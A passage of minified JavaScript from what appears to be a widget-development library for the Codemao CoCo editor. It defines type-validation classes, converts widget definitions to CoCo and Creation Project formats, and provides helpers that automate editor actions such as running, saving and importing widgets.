${E(this)}`,e,this);return!0}getSameDirectionChildren(){const e=[];return null!=this.returns&&e.push({key:"__slightning_coco_widget_function_return_value__",label:"函数返回值",type:this.returns}),null!=this.throws&&e.push({key:"__slightning_coco_widget_function_throw_value__",label:"函数抛出值",type:this.throws}),e}getReverseDirectionChildren(){const e=[];for(const t of this.block)"object"==typeof t&&e.push({key:`__slightning_coco_widget_function_param__${t.key}`,label:`函数参数·${t.label}`,type:t.type});return e}isVoid(){return!1}typeToStringPrepare(e,t){if(null!=this.block)for(const n of this.block)"object"==typeof n&&(new He).prepare(n.type,e,t);null!=this.returns&&(new He).prepare(this.returns,e,t),null!=this.throws&&(new He).prepare(this.throws,e,t)}typeToString(e,t){var n;let r="(",o=!0;for(const n of this.block)"object"==typeof n&&(o?o=!1:r+=", ",r+=`${n.label}: ${(new He).toString(n.type,e,t)}`);return r+=`) => ${(new He).toString(null!==(n=this.returns)&&void 0!==n?n:new _n,e,t)}`,null!=this.throws&&(r+=` 抛出 ${(new He).toString(this.throws,e,t)}`),r}inlineTypeToStringPrepare(e,t){this.typeToStringPrepare(e,t)}inlineTypeToString(e,t){return this.typeToString(e,t)}toCoCoPropertyValueTypes(){var e;return{valueType:["string","number","boolean","array","object"],checkType:"string",defaultValue:V(null!==(e=this.defaultValue)&&void 0!==e?e:$(this))}}toCoCoMethodParamValueTypes(){var e;return{valueType:["string","number","boolean","array","object"],checkType:"string",defaultValue:V(null!==(e=this.defaultValue)&&void 0!==e?e:$(this))}}toCoCoMethodValueTypes(){return{valueType:["string","number","boolean","array","object"]}}toCoCoEventParamValueTypes(){return{valueType:["string","number","boolean","array","object"]}}toCreationProjectPropValueTypes(){var e;return{valueType:"object",defaultValue:null!==(e=this.defaultValue)&&void 0!==e?e:$(this)}}toCreationProjectMethodParamValueTypes(){var e;if(!this.raw&&(null==this.returns||this.returns.isVoid())&&(null==this.throws||this.throws.isVoid())){const e=[];for(const t of this.block)"object"==typeof t&&e.push(Object.assign({key:t.key,label:t.label},t.type.toCreationProjectEmitParamValueTypes()));return{valueType:"code",codeParams:e}}return{valueType:"object",defaultValue:null!==(e=this.defaultValue)&&void 0!==e?e:$(this)}}toCreationProjectMethodValueTypes(){return{valueType:"object"}}toCreationProjectEmitParamValueTypes(){return{valueType:"object"}}}class kn{constructor({itemType:e,defaultValue:t}={}){this.itemType=e,this.defaultValue=null!=t?t:$(this)}validate(e){if(!Array.isArray(e))throw new pn(`不能将 ${O(e)} 分配给 ${E(this)}`,e,this);if(null!=this.itemType){const t=[];for(const[e,n]of Object.entries(t))try{C(`第 ${e} 项`,n,this.itemType)}catch(e){if(!(e instanceof pn))throw e;t.push(e)}if(0!=t.length)throw new pn(`不能将 ${O(e)} 分配给 ${E(this)}：\n`+t.map(e=>e.message.split("\n").map(e=>`　${e}`).join("\n")).join("\n"),e,this)}return!0}getSameDirectionChildren(){return null==this.itemType?[]:[{key:"__slightning_coco_widget_array_item__",label:"数组项",type:this.itemType}]}getReverseDirectionChildren(){return[]}isVoid(){return!1}typeToStringPrepare(e,t){null!=this.itemType&&(new He).prepare(this.itemType,e,t)}typeToString(e,t){let n="列表";return null!=this.itemType&&(n+=`<${(new He).toString(this.itemType,e,t)}>`),n}inlineTypeToStringPrepare(e,t){this.typeToStringPrepare(e,t)}inlineTypeToString(e,t){return this.typeToString(e,t)}toCoCoPropertyValueTypes(){return{valueType:["string","array"],checkType:"string",defaultValue:V("string"==typeof this.defaultValue?this.defaultValue:JSON.stringify(this.defaultValue))}}toCoCoMethodParamValueTypes(){return{valueType:["string","array"],checkType:"string",defaultValue:V("string"==typeof this.defaultValue?this.defaultValue:JSON.stringify(this.defaultValue))}}toCoCoMethodValueTypes(){return{valueType:"array"}}toCoCoEventParamValueTypes(){return{valueType:"array"}}toCreationProjectPropValueTypes(){return{valueType:"array",defaultValue:this.defaultValue}}toCreationProjectMethodParamValueTypes(){return{valueType:"array",defaultValue:this.defaultValue}}toCreationProjectMethodValueTypes(){return{valueType:"array"}}toCreationProjectEmitParamValueTypes(){return{valueType:"array"}}}class Tn{constructor({propertiesType:e,defaultValue:t}={}){this.propertiesType=e,this.defaultValue=null!=t?t:$(this)}validate(e){if(null==e||"object"!=typeof e)throw new pn(`不能将 ${O(e)} 分配给 ${E(this)}`,e,this);if(null!=this.propertiesType){const t=[];for(const[n,r]of Object.entries(this.propertiesType))try{if(r.isVoid())continue;if(!(n in e))throw new pn(`属性 ${n} 缺失`,e,this);C(`属性 ${n}`,e[n],r)}catch(e){if(!(e instanceof pn))throw e;t.push(e)}if(0!=t.length)throw new pn(`不能将 ${O(e)} 分配给 ${E(this)}：\n`+t.map(e=>e.message.split("\n").map(e=>`　${e}`).join("\n")).join("\n"),e,this)}return!0}getSameDirectionChildren(){return null==this.propertiesType?[]:Object.entries(this.propertiesType).map(([e,t])=>({key:`__slightning_coco_widget_object_property__${e}`,label:`字典属性·${e}`,type:t}))}getReverseDirectionChildren(){return[]}isVoid(){return!1}typeToStringPrepare(e,t){if(null!=this.propertiesType)for(const n of Object.values(this.propertiesType))(new He).prepare(n,e,t)}typeToString(e,t){let n="字典";if(null!=this.propertiesType){n+=` {\n${Object.entries(this.propertiesType).map(([n,r])=>`${n}: ${(new He).toString(r,e,t)}`).join("\n").split("\n").map(e=>`　${e}`).join("\n")}\n}`}return n}inlineTypeToStringPrepare(e,t){if(null!=this.propertiesType)for(const n of Object.values(this.propertiesType))(new He).prepare(n,e,t)}inlineTypeToString(e,t){let n="字典";if(null!=this.propertiesType){n+=` { ${Object.entries(this.propertiesType).map(([n,r])=>`${n}: ${(new He).toString(r,e,t)}`).join("; ")} }`}return n}toCoCoPropertyValueTypes(){return{valueType:["string","object"],checkType:"string",defaultValue:V("string"==typeof this.defaultValue?this.defaultValue:JSON.stringify(this.defaultValue))}}toCoCoMethodParamValueTypes(){return{valueType:["string","object"],checkType:"string",defaultValue:V("string"==typeof this.defaultValue?this.defaultValue:JSON.stringify(this.defaultValue))}}toCoCoMethodValueTypes(){return{valueType:"object"}}toCoCoEventParamValueTypes(){return{valueType:"object"}}toCreationProjectPropValueTypes(){return{valueType:"object",defaultValue:this.defaultValue}}toCreationProjectMethodParamValueTypes(){return{valueType:"object",defaultValue:this.defaultValue}}toCreationProjectMethodValueTypes(){return{valueType:"object"}}toCreationProjectEmitParamValueTypes(){return{valueType:"object"}}}class Sn extends kn{constructor({block:e,separators:t,separator:n,min:r,max:o,defaultNumber:l,transformMin:a,transformMax:i}){var s;const u=L(e),c={};for(const e of u)"object"==typeof e&&(c[e.key]=e.type);super({itemType:new Tn({propertiesType:c})}),this.block=u,this.separators=null!=t?t:"string"==typeof n?[n]:[],this.separator=null!==(s=null!=n?n:null==t?void 0:t.join(" "))&&void 0!==s?s:"",this.min=null!=r?r:2,this.max=null!=o?o:1/0,this.defaultNumber=null!=l?l:this.min,this.transformMin=null!=a?a:this.min,this.transformMax=null!=i?i:Math.min(this.min+5,this.max)}toCreationProjectMethodParamValueTypes(){const e=[];let t=null,n=[];function r(e){null==t?n.push(e):null==t.label?t.label=e:t.label.endsWith("\n")||e.startsWith("\n")?t.label+=e:t.label+=" "+e}const o=[...this.block,...this.separators];let l=o.length-1;for(;l>=0;l--){const a=o[l];null!=a&&(a==A.BREAK_LINE?r("\n"):"string"==typeof a?r(a):(t=Object.assign({key:a.key},a.type.toCreationProjectMethodParamValueTypes()),n.length>0&&(t.labelAfter=n.join(" "),n=[]),e.unshift(t)))}return{valueType:"mutator",mutator:e,mutatorMin:this.min,mutatorMax:this.max,mutatorItem:this.defaultNumber}}}function q(e,t){if(U(t.PropertyGroup)||U(t.PropertyTypes))for(const n={value:0};n.value<=e.properties.length;n.value++){const r=e.properties[n.value];null!=r&&("contents"in r?new jn({groupContents:e.properties,index:n,value:r}).traverse(t):new On({groupContents:e.properties,index:n,value:r}).traverse(t))}if(U(t.MethodGroup)||U(t.MethodTypes)||U(t.EventTypes)||U(t.BlockBoxOptions))for(const n={value:0};n.value<=e.methods.length;n.value++){const r=e.methods[n.value];if(null!=r)if("contents"in r)new Cn({groupContents:e.methods,index:n,value:r}).traverse(t);else if("type"in r)switch(r.type){case vn.METHOD:new En({groupContents:e.methods,index:n,value:r}).traverse(t);break;case vn.EVENT:new $n({groupContents:e.methods,index:n,value:r}).traverse(t)}else new Pn({groupContents:e.methods,index:n,value:r}).traverse(t)}}class Vn{get blockOptions(){var e,t,n;if(void 0!==this.__blockOptions)return this.__blockOptions;const{value:r}=this;return this.__blockOptions=T({},null!==(t=(null!==(e=this.group)&&void 0!==e?e:{}).blockOptions)&&void 0!==t?t:{},null!=r&&"object"==typeof r&&"blockOptions"in r&&null!==(n=r.blockOptions)&&void 0!==n?n:{})}constructor({group:e,groupContents:t,index:n,value:r}){this.group=e,this.groupContents=t,this.index=n,this.value=r,this.isRemoved=!1}remove(){this.isRemoved||(this.groupContents.splice(this.index.value,1),this.index.value--,this.isRemoved=!0)}removeNext(){this.groupContents.splice(this.index.value+1,1)}replaceWith(...e){this.remove(),this.insertAfter(...e)}insertAfter(...e){this.groupContents.splice(this.index.value+1,0,...e)}}class jn extends Vn{traverse(e){if(U(e.PropertyGroup)||U(e.PropertyTypes)){G(this,e.PropertyGroup);for(const t={value:0};t.value<=this.value.contents.length;t.value++){const n=this.value.contents[t.value];null!=n&&("contents"in n?new jn({group:this,groupContents:this.value.contents,index:t,value:n}).traverse(e):new On({group:this,groupContents:this.value.contents,index:t,value:n}).traverse(e))}X(this,e.PropertyGroup)}}}class On extends Vn{traverse(e){G(this,e.PropertyTypes),X(this,e.PropertyTypes)}}class Cn extends Vn{traverse(e){if(U(e.MethodGroup)||U(e.MethodTypes)||U(e.EventTypes)||U(e.BlockBoxOptions)){G(this,e.MethodGroup);for(const t={value:0};t.value<=this.value.contents.length;t.value++){const n=this.value.contents[t.value];if(null!=n)if("contents"in n)new Cn({group:this,groupContents:this.value.contents,index:t,value:n}).traverse(e);else if("type"in n)switch(n.type){case vn.METHOD:new En({group:this,groupContents:this.value.contents,index:t,value:n}).traverse(e);break;case vn.EVENT:new $n({group:this,groupContents:this.value.contents,index:t,value:n}).traverse(e)}else new Pn({group:this,groupContents:this.value.contents,index:t,value:n}).traverse(e)}X(this,e.MethodGroup)}}}class En extends Vn{traverse(e){G(this,e.MethodTypes),X(this,e.MethodTypes)}}class $n extends Vn{traverse(e){G(this,e.EventTypes),X(this,e.EventTypes)}}class Pn extends Vn{traverse(e){G(this,e.BlockBoxOptions),X(this,e.BlockBoxOptions)}}function U(e){return Y(e,"has",()=>function(e){return Y(e,"hasEnter",()=>null!=e&&("function"==typeof e||null!=e.enter||null!=e.entry))}(e)||function(e){return Y(e,"hasExit",()=>null!=e&&"function"!=typeof e&&null!=e.exit)}(e))}function J(){}function G(e,t){Y(t,"enter",()=>null==t?J:"function"==typeof t?t:null!=t.enter?t.enter:null!=t.entry?t.entry:J)(e)}function X(e,t){Y(t,"exit",()=>null!=t&&"object"==typeof t&&null!=t.exit?t.exit:J)(e)}const Mn={has:!1,hasEnter:!1,hasExit:!1};function Y(e,t,n){let r;null==e?r=Mn:(null==e.__slightning_coco_widget_visitor_cache__&&(e.__slightning_coco_widget_visitor_cache__={}),r=e.__slightning_coco_widget_visitor_cache__);const o=r[t];return null==o?r[t]=n():o}function K(e){return"object"==typeof e&&(e.type instanceof mn&&!e.type.raw)}function Z(e){return"object"==typeof e&&(e.type instanceof mn&&!e.type.raw&&(null!=e.type.returns&&!e.type.returns.isVoid()||null!=e.type.throws&&!e.type.throws.isVoid()))}function z(e){return"object"==typeof e&&e.type instanceof Sn}const Nn={};function Q(e,...t){var r;e=null!==(r=Nn[e])&&void 0!==r?r:e,n().emit.call(this,e,...t)}function ee(e){var t,n,r,o,l;const a={type:e.type,title:e.info.title,icon:e.info.icon,version:null!==(t=e.info.version)&&void 0!==t?t:void 0,docs:{url:null!==(r=null===(n=e.info.url)||void 0===n?void 0:n.docs)&&void 0!==r?r:void 0},isInvisibleWidget:!e.options.visible,isGlobalWidget:e.options.global,platforms:null!==(o=e.options.platforms)&&void 0!==o?o:void 0,hasAnyWidget:null!==(l=e.options.any)&&void 0!==l?l:void 0,properties:[],methods:[],events:[]},i=[];let s=!1,u=!1,c=null,p=0;return q(e,{PropertyGroup:{enter(e){null!=e.value.label&&(i.push(e.value.label),s=!0),u=!0},exit(e){null!=e.value.label&&(i.pop(),s=!0),u=!0}},PropertyTypes(e){var t;u&&(null!=c&&(null!==(t=c.blockOptions)&&void 0!==t||(c.blockOptions={}),c.blockOptions.space=40),u=!1),a.properties.push(c=Object.assign(Object.assign({key:e.value.key,label:e.value.label},e.value.type.toCoCoPropertyValueTypes()),{blockOptions:{getter:{generateBlock:0!=e.blockOptions.get},setter:{generateBlock:0!=e.blockOptions.set},line:"string"==typeof s?s:s?i.join("·"):void 0}})),s=!1},MethodGroup:{enter(e){null!=e.value.label&&(i.push(e.value.label),s=!0),u=!0},exit(e){null!=e.value.label&&(i.pop(),s=!0),u=!0}},MethodTypes(e){var t,n,r,o,l,y,f,b,d,h,g;u&&(null!=c&&(null!==(t=c.blockOptions)&&void 0!==t||(c.blockOptions={}),c.blockOptions.space=40),u=!1);const{value:w}=e;if(null!=w.throws&&!w.throws.isVoid())throw new Error(`无法将方法 ${w.label} 的抛出类型转为 CoCo 类型`);const v=null!==(r=null!==(n=w.deprecated)&&void 0!==n?n:e.blockOptions.deprecated)&&void 0!==r&&r,_=Object.assign(Object.assign({key:w.key,params:[]},null===(o=w.returns)||void 0===o?void 0:o.toCoCoMethodValueTypes()),{tooltip:null!==(l=w.tooltip)&&void 0!==l?l:void 0,blockOptions:{callMethodLabel:!1,line:"string"==typeof s?s:s?i.join("·"):void 0,order:++p,icon:null!==(y=e.blockOptions.icon)&&void 0!==y?y:void 0,color:v?x.GREY:null!==(f=e.blockOptions.color)&&void 0!==f?f:void 0,inputsInline:null!==(b=e.blockOptions.inline)&&void 0!==b?b:void 0}});"string"==typeof v?null==_.tooltip?_.tooltip=`${v}`:_.tooltip=`${v}\n\n${_.tooltip}`:v&&(null==_.tooltip?_.tooltip="该方法已弃用，并且可能在未来版本中移除，请尽快迁移到其他方法":_.tooltip=`该方法已弃用，并且可能在未来版本中移除，请尽快迁移到其他方法\n\n${_.tooltip}`),null!==(d=_.blockOptions)&&void 0!==d||(_.blockOptions={});if(null===(h=e.blockOptions.inline)||void 0===h||h){let k=null,T=[];if(0!=v&&T.push("[已弃用]"),!w.block.includes(A.THIS))throw new Error(`方法 ${w.label} 缺少 this 参数`);for(let V=0;V<w.block.length;V++){const j=w.block[V];if(j==A.METHOD)T.push(w.label);else if(j==A.BREAK_LINE)T.push("");else{if(j==A.THIS){k=w.block.slice(V+1);break}if("string"==typeof j)T.push(j);else if(null!=j)throw new Error(`方法 ${w.label} 的积木 this 参数前存在他参数，不能将其转为 CoCo 类型`)}}if(null==k)throw new Error(`方法 ${w.label} 缺少 this 参数`);0!=T.length&&(_.blockOptions.callMethodLabel=T.join(" "));let S=null;function m(e){null==S?null==_.label?_.label=e:_.label=`${_.label} ${e}`:null==S.labelAfter?S.labelAfter=e:S.labelAfter=`${S.labelAfter} ${e}`}for(const O of k){if(O==A.THIS)throw new Error(`方法只能有一个 this 参数，而方法 ${w.label} 有多个 this 参数`);O==A.METHOD?m(w.label):"string"==typeof O?m(O):(S=Object.assign({key:O.key},O.type.toCoCoMethodParamValueTypes()),_.params.push(S))}}else{_.blockOptions.inputsInline=!1;const C=function(e,t){const n=[];let r=[];for(const o of e)o!==t?r.push(o):(n.push(r),r=[]);return n.push(r),n}(w.block,A.BREAK_LINE);if(C.every(e=>1==e.filter(e=>e==A.THIS||"object"==typeof e).length)){if(!w.block.includes(A.THIS))throw new Error(`方法 ${w.label} 缺少 this 参数`);let E=[],$=!1,P=[];for(const M of null!==(g=C[0])&&void 0!==g?g:[])if(M==A.THIS){if($)throw new Error(`方法只能有一个 this 参数，而方法 ${w.label} 有多个 this 参数`);$=!0}else{if("string"!=typeof M)throw new Error(`方法 ${w.label} 的积木 this 参数前存在他参数，不能将其转为 CoCo 类型`);{const N=M==A.METHOD?w.label:M;($?E:P).push(N)}}if(!$)throw new Error(`方法 ${w.label} 的积木 this 参数前存在他参数，不能将其转为 CoCo 类型`);0!=E.length&&(_.blockOptions.callMethodLabel=E.join(" ")),_.label=P.join(" ");for(const I of C.slice(1)){let R=[],L=null,D=[];for(const B of I){if(B==A.THIS)throw new Error(`方法只能有一个 this 参数，而方法 ${w.label} 有多个 this 参数`);if("string"==typeof B){const W=B==A.METHOD?w.label:B;(null==L?R:D).push(W)}else L=B}_.params.push(Object.assign({key:L.key,label:R.join(" "),labelAfter:D.join(" ")},L.type.toCoCoMethodParamValueTypes()))}}else{_.label=w.label;for(const F of w.block)"object"==typeof F&&_.params.push(Object.assign({key:F.key,label:F.label},F.type.toCoCoMethodParamValueTypes()))}0!=v&&(_.blockOptions.callMethodLabel=`[已弃用] ${_.blockOptions.callMethodLabel||""}`)}s=!1,c=_,a.methods.push(_)},EventTypes(e){var t,n,r,o,l,y;u&&(null!=c&&(null!==(t=c.blockOptions)&&void 0!==t||(c.blockOptions={}),c.blockOptions.space=40),u=!1);const f=null!==(r=null!==(n=e.value.deprecated)&&void 0!==n?n:e.blockOptions.deprecated)&&void 0!==r&&r,b={key:e.value.key,subTypes:null!==(o=e.value.subTypes)&&void 0!==o?o:void 0,label:0!=f?`[已弃用] ${e.value.label}`:e.value.label,params:e.value.params.map(e=>Object.assign({key:e.key,label:e.label},e.type.toCoCoEventParamValueTypes())),tooltip:null!==(l=e.value.tooltip)&&void 0!==l?l:void 0,blockOptions:{line:"string"==typeof s?s:s?i.join("·"):void 0,order:++p,icon:null!==(y=e.blockOptions.icon)&&void 0!==y?y:void 0}};null!=e.value.subTypes&&te(e.value.subTypes,0,[e.value.key],[e.value.key],[e.value.label],e.value),"string"==typeof f?null==b.tooltip?b.tooltip=`${f}`:b.tooltip=`${f}\n\n${b.tooltip}`:f&&(null==b.tooltip?b.tooltip="该事件已弃用，并且可能在未来版本中移除，请尽快迁移到其他事件":b.tooltip=`该事件已弃用，并且可能在未来版本中移除，请尽快迁移到其他事件\n\n${b.tooltip}`),s=!1,c=b,a.events.push(b)},BlockBoxOptions(e){var t;null!=e.value.space&&null!=c&&(null!==(t=c.blockOptions)&&void 0!==t||(c.blockOptions={}),c.blockOptions.space=e.value.space),null!=e.value.line&&(s=e.value.line)}}),a}function te(e,t,n,r,o,l){if(t>=e.length)return void(Nn[r.join("")]=n.join(""));const a=e[t];if(null!=a)for(const i of a.dropdown)te(e,t+1,[...n,i.value],[...r,S(i.value)],[...o,i.label],l);else te(e,t+1,n,r,o,l)}function ne(e,t,n,r){var o,l,a;for(const l of null!==(o=null==n?void 0:n.decorators)&&void 0!==o?o:[])if("object"==typeof l){for(const[n,o]of Object.entries(l))if(null!=o&&n.split("|").includes(r))if(Array.isArray(o))for(const n of o)[e,t]=n(e,t);else[e,t]=o(e,t)}else[e,t]=l(e,t);for(const o of null!==(a=null===(l=null==n?void 0:n[r])||void 0===l?void 0:l.decorators)&&void 0!==a?a:[])[e,t]=o(e,t);return[e,t]}function re(e){return/^https?:\/\/coco\.codemao\.cn\/editor\/((#|\?).*)?$/.test(e.location.href)}function oe(){if(re(window))return window;try{if(parent!=window&&re(parent))return parent}catch(e){}try{if(opener instanceof Window&&re(opener))return opener}catch(e){}return null}function le(){var e,t,n;return null!==(n=null===(t=null===(e=oe())||void 0===e?void 0:e.document.querySelector('input[placeholder="请输入作品名称"]'))||void 0===t?void 0:t.value)&&void 0!==n?n:null}function ae(){var e,t;return null!==(t=null===(e=oe())||void 0===e?void 0:e.document.querySelector('[class^="style_playButton"]'))&&void 0!==t?t:null}function ie(){var e,t;return/[\s]*停[\s]*止[\s]*/.test(null!==(t=null===(e=ae())||void 0===e?void 0:e.textContent)&&void 0!==t?t:"")}const An={getSuperWidget:e=>class extends(e.options.visible?De:Le){constructor(t){if(super(t),e.options.visible){const n=new Set;function r(e){for(const t of e)"contents"in t?r(t.contents):n.add(Array.isArray(t)?t[0]:t.key)}r(e.properties);let o=!1;return new Proxy(this,{set:(e,t,r,l)=>!o&&"string"==typeof t&&n.has(t)?(o=!0,De.prototype.setProps.call(e,{[t]:r}),o=!1,!0):Reflect.set(e,t,r,l)})}}},exportWidget(e,t,n){[e,t]=ne(e,t,n,"CoCo"),function(e,t){Be.types=e,Be.widget=t}(...function(e,t){return[ee(e),new Proxy(t,{construct(e,t,n){const[r]=t,o=Reflect.construct(e,t,n);for(const[e,t]of Object.entries(r))Object.defineProperty(o,e,{value:t,writable:!0,enumerable:!0,configurable:!0});return o}})]}(e,t))},Logger:class{constructor(e,t){this.widget=t,this.super=e.options.visible?De:Le}log(e){this.super.prototype.widgetLog.call(this.widget,e)}info(e){this.super.prototype.widgetLog.call(this.widget,`[信息] ${e}`)}warn(e){this.super.prototype.widgetWarn.call(this.widget,e)}error(e){this.super.prototype.widgetError.call(this.widget,e)}},emit(e,...t){Le.prototype.emit.call(this,e,...t)},utils:{inNative:()=>"file:///android_asset/www/index.html"==location.href,inEditor:()=>/^https?:\/\/coco\.codemao\.cn\/editor\/(editor-player.html)?((#|\?).*)?$/.test(location.href),inEditorWindow:()=>re(window),inEditorPlayer:()=>/^https?:\/\/coco\.codemao\.cn\/editor\/editor-player.html((#|\?).*)?$/.test(location.href),editor:{getWindow:oe,getWorkName:le,getRunButton:ae,isRunningWork:ie,runWork(){var e;ie()||null===(e=ae())||void 0===e||e.click()},stopWork(){var e;ie()&&(null===(e=ae())||void 0===e||e.click())},saveWork:()=>new Promise((e,t)=>{var n;const r=oe();if(null==r)return void t(new Error("找不到编辑器窗口"));const o=Array.from(null!==(n=r.document.querySelectorAll(".coco-button.coco-button-circle"))&&void 0!==n?n:[]).find(e=>null!=e.querySelector('[class*="Header_saveText"]'));if(!(o instanceof HTMLElement))return void t(new Error("找不到保存按钮"));o.click();const l=setInterval(()=>{Array.from(o.classList).some(e=>e.startsWith("Header_saving"))||(clearInterval(l),e())},100)}),reopenWork(){const e=le();if(null==e)throw new Error("找不到作品名称");const t=oe();if(null==t)throw new Error("找不到编辑器窗口");const n=Array.from(t.document.querySelectorAll(".coco-menu-item")).find(e=>{var t;return"打开"==(null===(t=e.children[0])||void 0===t?void 0:t.textContent)});if(!(n instanceof HTMLElement))throw new Error("找不到打开按钮");n.click();const r=setInterval(()=>{var n;const o=t.document.querySelector('[class*="MyProject_main"]');if(!(o instanceof HTMLElement))return;clearInterval(r);const l=Array.from(o.querySelectorAll('[class*="MyProject_name"]')).find(t=>t.textContent==e);if(null==l)throw new Error("找不到作品");null===(n=l.parentElement)||void 0===n||n.click(),setTimeout(()=>{const e=Array.from(t.document.querySelectorAll(".coco-button.coco-button-primary.coco-button-circle")).find(e=>"保存"==e.textContent);e instanceof HTMLElement&&e.click()},150)},100)},importWidget:e=>new Promise((t,n)=>{var r,o,l,a;if("string"==typeof e&&(e=new Blob([e],{type:"text/javascript"})),e instanceof Blob&&(e=new File([e],"widget.js",{type:"text/javascript"})),!(e instanceof File))return void n(new Error("参数错误，widget 必须是 File 或 Blob 或字符串"));const i=Array.from(null!==(l=null===(o=null===(r=oe())||void 0===r?void 0:r.document)||void 0===o?void 0:o.querySelectorAll(".coco-upload-button-content"))&&void 0!==l?l:[]).find(e=>"导入自定义控件"==e.textContent);if(!(i instanceof HTMLElement))return void n(new Error("找不到自定义控件导入按钮"));const s=null===(a=i.parentElement)||void 0===a?void 0:a.querySelector("input[type=file]");if(!(s instanceof HTMLInputElement))return void n(new Error("找不到自定义控件导入按钮"));const u=new DataTransfer;u.items.add(e),s.files=u.files,s.dispatchEvent(new Event("change",{bubbles:!0})),setTimeout(()=>{var e;const n=document.querySelector(".coco-button.coco-button-primary.coco-button-dangerous.coco-button-circle");n instanceof HTMLButtonElement&&"覆盖"==(null===(e=n.childNodes[0])||void 0===e?void 0:e.textContent)&&n.click(),t()},150)})},getImageURLByFileName(e){var t,n;return null!==(n=null===(t=Re("utils"))||void 0===t?void 0:t.getWidgetImageUrl(e))&&void 0!==n?n:null},getAudioURLByFileName:()=>null,getVideoURLByFileName:()=>null}},xn=__slightning_coco_widget_require__,In=widgetClass,Rn=__slightning_coco_widget_exports__;class Ln{constructor(e={}){var t;"number"==typeof e&&(e={defaultValue:e}),this.defaultValue=null!==(t=e.defaultValue)&&void 0!==t?t:0,this.range=e.range}validate(e){if("number"!=typeof e)throw new pn(`不能将 ${O(e)} 分配给 ${E(this)}`,e,this);if(null!=this.range&&!this.range.includes(e))throw new pn(`不能将 ${O(e)} 分配给 ${E(this)}：整数超出范围`,e,this);return!0}getSameDirectionChildren(){return[]}getReverseDirectionChildren(){return[]}isVoid(){return!1}typeToString(){return"整数"}inlineTypeToString(){return this.typeToString()}toCoCoPropertyValueTypes(){return{valueType:"number",defaultValue:this.defaultValue}}toCoCoMethodParamValueTypes(){return{valueType:"number",defaultValue:this.defaultValue}}toCoCoMethodValueTypes(){return{valueType:"number"}}toCoCoEventParamValueTypes(){return{valueType:"number"}}toCreationProjectPropValueTypes(){return{valueType:"number",defaultValue:this.defaultValue}}toCreationProjectMethodParamValueTypes(){return{valueType:"number",defaultValue:this.defaultValue}}toCreationProjectMethodValueTypes(){return{valueType:"number"}}toCreationProjectEmitParamValueTypes(){return{valueType:"number"}}}function se(e){var t;const n={},r={type:e.type,label:e.info.title,icon:e.info.icon,category:null!==(t=e.info.category)&&void 0!==t?t:void 0,visibleWidget:e.options.visible,global:e.options.global,default:n,props:[],methods:[],emits:[]},o=[];let l=!1,a=!1;return q(e,{PropertyGroup:{enter(e){null!=e.value.label&&(o.push(e.value.label),l=!0),a=!0},exit(e){null!=e.value.label&&(o.pop(),l=!0),a=!0}},PropertyTypes(e){"__width"==e.value.key&&(e.value.type instanceof Ln||e.value.type instanceof hn)?n.width=e.value.type.defaultValue:"__height"==e.value.key&&(e.value.type instanceof Ln||e.value.type instanceof hn)?n.height=e.value.type.defaultValue:r.props.push(Object.assign(Object.assign({key:e.value.key,label:e.value.label},e.value.type.toCreationProjectPropValueTypes()),{noBlock:(()=>{var t,n,r,o,l;if(null!==(n=null===(t=e.value.blockOptions)||void 0===t?void 0:t.get)&&void 0!==n&&!n||null!==(o=null===(r=e.value.blockOptions)||void 0===r?void 0:r.set)&&void 0!==o&&!o){if(0==(null===(l=e.value.blockOptions)||void 0===l?void 0:l.get)&&0==e.value.blockOptions.set)return!0;throw new Error(`无法将属性 ${e.value.label} 转为 Creation Project 类型`)}return!1})()}))},MethodGroup:{enter(e){null!=e.value.label&&(o.push(e.value.label),l=!0),a=!0},exit(e){null!=e.value.label&&(o.pop(),l=!0),a=!0}},MethodTypes(e){var t,n,i,s,u,c,p,y,f;const{value:b}=e;if(null!=b.throws&&!b.throws.isVoid())throw new Error(`无法将方法 ${b.label} 的抛出类型转为 Creation Project 类型`);const d=null!==(n=null!==(t=b.deprecated)&&void 0!==t?t:e.blockOptions.deprecated)&&void 0!==n&&n,h=Object.assign(Object.assign({key:b.key,tipBefore:"",tipAfter:"",params:[]},null===(i=b.returns)||void 0===i?void 0:i.toCreationProjectMethodValueTypes()),{tooltip:null!==(s=b.tooltip)&&void 0!==s?s:void 0,color:d?x.GREY:null!==(u=e.blockOptions.color)&&void 0!==u?u:void 0,flyoutOptions:{line:"string"==typeof l?l:l?o.join("·"):void 0}});"string"==typeof d?null==h.tooltip?h.tooltip=`${d}`:h.tooltip=`${d}\n\n${h.tooltip}`:d&&(null==h.tooltip?h.tooltip="该方法已弃用，并且可能在未来版本中移除，请尽快迁移到其他方法":h.tooltip=`该方法已弃用，并且可能在未来版本中移除，请尽快迁移到其他方法\n\n${h.tooltip}`);const g=null===(c=e.blockOptions.inline)||void 0===c||c;if(g||b.block.includes(A.BREAK_LINE)){let v=null,_=[];function w(e){null==v?_.unshift(e):null==v.label?v.label=e:e.endsWith("\n")||v.label.startsWith("\n")?v.label=e+v.label:v.label=e+" "+v.label}let m=b.block.length-1;for(;m>=0;m--){const T=b.block[m];if(null!=T){if(T==A.THIS)break;T==A.METHOD?w(b.label):T==A.BREAK_LINE?w(g?"":"\n"):"string"==typeof T?w(T):(v=Object.assign({key:T.key},T.type.toCreationProjectMethodParamValueTypes()),_.length>0&&(v.labelAfter=_.join(" "),_=[]),h.params.unshift(v))}}if(b.block[m]!=A.THIS)throw new Error(`方法 ${b.label} 缺少 this 参数`);_.length>0&&(h.label=_.join(" ")),m--;let k=[];for(;m>=0;m--){const S=b.block[m];if(null!=S){if(S==A.THIS)throw new Error(`方法只能有一个 this 参数，而方法 ${b.label} 有多个 this 参数`);if(S==A.METHOD)k.unshift(b.label);else if(S==A.BREAK_LINE)k.unshift(g?"":"\n");else{if("string"!=typeof S)throw new Error(`方法 ${b.label} 的积木 this 参数前存在他参数，不能将其转为 Creation Project 类型`);k.unshift(S)}}}0!=d&&k.unshift("[已弃用]"),h.tipBefore=k.join(" ").replace(/( )?\n( )?/g,"\n")}else{0!=d&&(h.tipBefore="[已弃用]"),h.label=b.label;for(const V of b.block)if("object"==typeof V)if(V.type instanceof Sn){const j=V.type.toCreationProjectMethodParamValueTypes();for(const O of null!==(p=j.mutator)&&void 0!==p?p:[])O.label=`\n${null!==(y=O.label)&&void 0!==y?y:""}`;h.params.push(Object.assign({key:V.key},j))}else h.params.push(Object.assign({key:V.key,label:`\n${V.label}`},V.type.toCreationProjectMethodParamValueTypes()))}0!=a&&(null!==(f=h.flyoutOptions)&&void 0!==f||(h.flyoutOptions={}),h.flyoutOptions.gap="number"==typeof a?a:40,a=!1),l=!1,r.methods.push(h)},EventTypes(e){var 